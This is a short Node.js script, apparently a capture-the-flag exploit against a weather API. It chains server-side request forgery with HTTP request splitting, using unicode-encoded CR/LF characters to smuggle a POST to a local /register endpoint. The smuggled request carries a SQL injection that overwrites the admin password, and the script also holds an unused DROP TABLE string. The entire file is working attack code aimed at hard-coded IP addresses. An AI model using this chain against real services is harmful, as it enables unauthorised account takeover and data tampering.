import fetch from 'node-fetch';
async function makeRequest() {
    const baseUrl = "127.0.0.1/";
    const s = "\u0120"; // s is space 
    const r = "\u010D"; // \r
    const n = "\u010A"; // \n
    const sic = "%27"; //singleInvertedConverted
    const dic = "%22"; //double inverted comma
    let username = 'admin';
    let deleteAdmin = "DROP" + s + "users" + s + "IF" + s + "EXISTS" + s + "admin;";
    let password = "test')" + s + "ON" + s + "CONFLICT" + s + "(username)" + s + "DO" + s + "UPDATE" + s + "SET" + s + "password" + s + "=" + "%27test%27;"
    username = username.replace(" ", s).replace("'", sic).replace('"', dic);
    password = password.replace(" ", s).replace("'", sic).replace('"', dic);
    const contentLength = username.length + password.length + 19;
    const rn = r + n;
    const httpTag = "HTTP/1.1";
    const hostHeader = "Host:" + s + "127.0.0.1";
    const postReqTag = "POST" + s + "/register";
    const contentTypeHeader = "Content-Type:" + s + "application/x-www-form-urlencoded"
    const contentLengthHeader = "Content-Length:" + s + contentLength.toString();
    const connectionCloseHeader = "Connection:" + s + "close"
    const payloadUrl = baseUrl + s + httpTag + rn + hostHeader + rn + rn + postReqTag + s + httpTag + rn + hostHeader + rn + contentTypeHeader + rn + contentLengthHeader + rn + rn + "username=" + username + "&password=" + password + rn + rn + "GET" + s;
    const postRequestPayload = JSON.stringify({ endpoint: payloadUrl, city: "Toronto", country: "CA" });

    const result = await fetch('http://"142.93.32.153:31117/"/api/weather', {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://139.59.175.51:31648/',
            'Content-Type': 'application/json',
            'Origin': 'http://139.59.175.51:31648',
            'Content-Length': '67',
            'Connection': 'close'
        },
        body: postRequestPayload
    });
    console.log(result);
    const body = await result.text();
    console.log(body);
}

makeRequest();

